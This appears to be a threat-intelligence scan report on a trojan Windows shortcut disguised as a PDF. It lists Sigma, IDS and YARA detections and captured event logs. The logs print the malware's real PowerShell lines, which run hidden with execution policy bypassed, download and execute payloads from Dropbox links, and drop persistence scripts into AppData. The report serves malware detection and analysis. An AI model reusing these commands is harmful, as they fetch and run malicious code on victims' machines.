attributes.magic: MS Windows shortcut, Has Description string, Has command line arguments, Icon number=0, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hidenormalshowminimized

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Suspicious Parent Double Extension File Execution
sigma_analysis_results.rule_description: Detect execution of suspicious double extension files in ParentCommandLine

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" Start-Process -FilePath "C:\Users\Bruno\Desktop\V02_D.pdf.pdf.lnk"; CommandLine="C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"                                                                                                                                                                                                                                                                                                              -windowstyle hidden -nop -NoProfile -NonInteractive -ExecutionPolicy Bypass -c "$ss =\"JGhoaCA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0 [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects usage of the "FromBase64String" function in the commandline which is used to decode a base64 encoded string

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "?????V02_???D.pdf.pdf"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/lc7j7be3vtd2f3hadv0bz/V02_-D.pdf.pdf?rlkey=wnah9edf39vv8va7gvmodymch&st=64lizr6k&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/gs58u6qvvxorzttv09yvt/kxsxhx-x.txt?rlkey=v86pd7i2njm7u0pfutl0knu68&st=gjvdcw8r&dl=0" -OutFile $aaa; & $aaa; Remo [TRUNCATED]; MessageTotal=1; ScriptBlockId=8ab577a5-8dce-41b0-a77c-9509804c43d9; Path=C:\Users\BCCBIURIeiJi\AppData\Roaming\user.ps1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code

match_context.values:
@{ScriptBlockText=
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\ [TRUNCATED]; MessageTotal=1; ScriptBlockId=7758d28d-498e-47e3-8da8-1d0cb9acd1b4; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/gs58u6qvvxorzttv09yvt/kxsxhx-x.txt?rlkey=v86pd7i2njm7u0pfutl0knu68&st=gjvdcw8r&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
; Path=C:\Users\george\AppData\Roaming\chrome.ps1; ScriptBlockId=55e3e5c0-fa16-4fa1-98fc-786c2d77751b; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "?????V02_???D.pdf.pdf"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/lc7j7be3vtd2f3hadv0bz/V02_-D.pdf.pdf?rlkey=wnah9edf39vv8va7gvmodymch&st=64lizr6k&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/gs58u6qvvxorzttv09yvt/kxsxhx-x.txt?rlkey=v86pd7i2njm7u0pfutl0knu68&st=gjvdcw8r&dl=0" -OutFile $aaa; & $aaa; Remo [TRUNCATED]; MessageTotal=1; ScriptBlockId=8ab577a5-8dce-41b0-a77c-9509804c43d9; Path=C:\Users\BCCBIURIeiJi\AppData\Roaming\user.ps1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" Start-Process -FilePath "C:\Users\Bruno\Desktop\V02_D.pdf.pdf.lnk"; CommandLine="C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"                                                                                                                                                                                                                                                                                                              -windowstyle hidden -nop -NoProfile -NonInteractive -ExecutionPolicy Bypass -c "$ss =\"JGhoaCA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0 [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"                                                                                                                                                                                                                                                                                                              -windowstyle hidden -nop -NoProfile -NonInteractive -ExecutionPolicy Bypass -c "$ss =\"JGhoaCA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0V [TRUNCATED]; Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_description: Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

match_context.values: @{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\user.ps1; EventID=11}
@{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\chrome.ps1}
@{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\george\AppData\Roaming\user.ps1}
@{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\george\AppData\Roaming\chrome.ps1; EventID=11}

crowdsourced_ids_results.rule_msg: ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)"; flow:established,to_server; tls.sni; content:"dl.dropboxusercontent.com"; bsize:25; fast_pattern; classtype:misc-activity; sid:2035593; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_03_24, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2022_03_24;)

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Detects PowerShell invocation with suspicious parameters
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects LNK file with suspicious content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This YARA file detects padded LNK files designed to exploit ZDI-CAN-25373.
crowdsourced_yara_results.author: Peter Girnus
